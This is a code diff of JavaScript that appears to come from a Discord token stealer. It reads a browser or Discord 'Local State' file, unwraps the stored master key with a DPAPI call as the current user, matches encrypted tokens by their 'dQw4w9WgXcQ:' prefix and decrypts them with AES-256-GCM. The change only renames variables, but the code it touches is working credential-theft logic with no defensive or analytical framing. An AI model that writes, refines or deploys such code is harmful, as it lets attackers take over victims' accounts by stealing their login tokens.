@@ -30,10 +30,12 @@ const processFile = async (filePath, pathTail, allTokens) => {
         const localStatePath = pathTail.replace("Local Storage", "Local State");
         const localStateData = await fs.promises.readFile(localStatePath, 'utf8');
         const localState = JSON.parse(localStateData);
+        
         const encrypted = Buffer.from(localState.os_crypt.encrypted_key, 'base64').slice(5);
-        const bufferEncrypted = Buffer.from(encrypted, 'utf-8');
 
-        const key = Aurita.unprotectData(bufferEncrypted, null, 'CurrentUser');
+        const masterKey = Buffer.from(encrypted, 'utf-8');
+
+        const decrypted = Aurita.unprotectData(masterKey, null, 'CurrentUser');
 
         const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/;
 
@@ -51,7 +53,7 @@ const processFile = async (filePath, pathTail, allTokens) => {
                                 const middle = token.slice(15, token.length - 16);
                                 const end = token.slice(token.length - 16);
 
-                                const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+                                const decipher = crypto.createDecipheriv('aes-256-gcm', decrypted, start);
                                 decipher.setAuthTag(end);
 
                                 token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
